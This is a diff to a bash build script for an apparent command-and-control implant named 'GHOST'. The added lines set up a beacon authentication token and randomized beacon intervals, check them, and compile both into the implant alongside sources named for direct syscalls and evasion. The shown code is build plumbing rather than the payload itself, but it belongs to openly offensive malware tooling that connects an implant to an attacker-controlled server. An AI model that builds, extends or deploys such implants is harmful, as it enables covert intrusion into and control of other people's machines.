@@ -93,6 +93,22 @@ fi
 [[ "$C2HOST" =~ ^[A-Za-z0-9._-]+$ ]] || { echo "[!] invalid C2 host: $C2HOST"; exit 1; }
 [[ "$C2PORT" =~ ^[0-9]+$ && "$C2PORT" -ge 1 && "$C2PORT" -le 65535 ]] || { echo "[!] invalid C2 port: $C2PORT"; exit 1; }
 
+# ── Beacon token (authenticates implant → server; must match the server) ──────
+# Env: GHOST_BEACON_TOKEN, or prompted, or a random token is generated and
+# printed — start the server with the SAME value (--beacon-token).
+BEACON_TOKEN="${GHOST_BEACON_TOKEN:-}"
+if [[ -z "$BEACON_TOKEN" ]]; then
+    read -rp "Beacon token [enter = generate random]: " BEACON_TOKEN || BEACON_TOKEN=""
+    [[ -z "$BEACON_TOKEN" ]] && BEACON_TOKEN=$(python3 -c "import secrets; print(secrets.token_hex(32))")
+fi
+[[ "$BEACON_TOKEN" =~ ^[A-Za-z0-9_-]{16,128}$ ]] || { echo "[!] invalid beacon token (use 16-128 alnum/-/_ chars)"; exit 1; }
+
+# ── Beacon timing in seconds (env: GHOST_BEACON_MIN / GHOST_BEACON_MAX) ───────
+BEACON_MIN="${GHOST_BEACON_MIN:-18}"
+BEACON_MAX="${GHOST_BEACON_MAX:-24}"
+[[ "$BEACON_MIN" =~ ^[0-9]+$ && "$BEACON_MAX" =~ ^[0-9]+$ && "$BEACON_MIN" -ge 3 && "$BEACON_MIN" -le "$BEACON_MAX" ]] \
+    || { echo "[!] invalid beacon timing (need 3 <= MIN <= MAX)"; exit 1; }
+
 # ─────────────────────────────────────────────────────────────────────────────
 #  Shared compiler flags
 # ─────────────────────────────────────────────────────────────────────────────
@@ -173,6 +189,9 @@ echo "[*] Compiling $IMPLANT_OUT …"
 "$CXX" "${COMMON_FLAGS[@]}" "${OPT_FLAGS[@]}" \
     "-DGHOST_C2_HOST=L\"${C2HOST}\"" \
     "-DGHOST_C2_PORT=${C2PORT}" \
+    "-DGHOST_BEACON_TOKEN_W=L\"${BEACON_TOKEN}\"" \
+    "-DGHOST_BEACON_MIN=${BEACON_MIN}" \
+    "-DGHOST_BEACON_MAX=${BEACON_MAX}" \
     src/main.cpp         \
     src/syscalls.cpp     \
     src/evasion.cpp      \
